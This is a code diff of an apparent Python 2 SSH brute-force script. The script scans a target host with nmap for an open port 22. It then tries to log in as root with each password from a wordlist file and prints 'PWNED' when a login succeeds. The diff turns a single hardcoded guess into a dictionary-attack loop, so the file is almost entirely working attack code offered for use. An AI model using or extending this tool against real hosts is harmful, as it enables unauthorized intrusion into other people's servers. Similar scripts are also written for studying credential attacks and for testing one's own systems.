@@ -10,12 +10,12 @@ def checkSSHOpen(tgtHost):
     state = nmScan[tgtHost]['tcp'][22]['state']
     return state
 
-def attackSSH(tgtHost):
+def attackSSH(tgtHost, username, pw):
     print "Attacking SSH"
     # get ip address and use root account to login
     try:
         s = pxssh.pxssh()
-        s.login(tgtHost, 'root', 'password')
+        s.login(tgtHost, username, pw)
         print 'PWNED'
         s.logout()    
     # run through password dictionary and if found,
@@ -26,7 +26,7 @@ def attackSSH(tgtHost):
 
 def main():
     parser = argparse.ArgumentParser(description='usage: ./sshbf.py'+\
-    '-H <target host>')
+    ' -H <target host>')
     parser.add_argument('-H', dest='tgtHost', help='specify target host')
     args = parser.parse_args()
     tgtHost = args.tgtHost
@@ -37,7 +37,13 @@ def main():
     
     if (checkSSHOpen(tgtHost) == 'open'):
         print 'SSH port open'
-        attackSSH(tgtHost)
+        f = open("simplepwlist.txt")
+        passwords = f.readlines()
+        f.close()
+        #run through a loop of passwords with root account
+        username = 'root'
+        for pw in passwords:
+            attackSSH(tgtHost, username, pw)
     else:
         print 'SSH port closed'
     
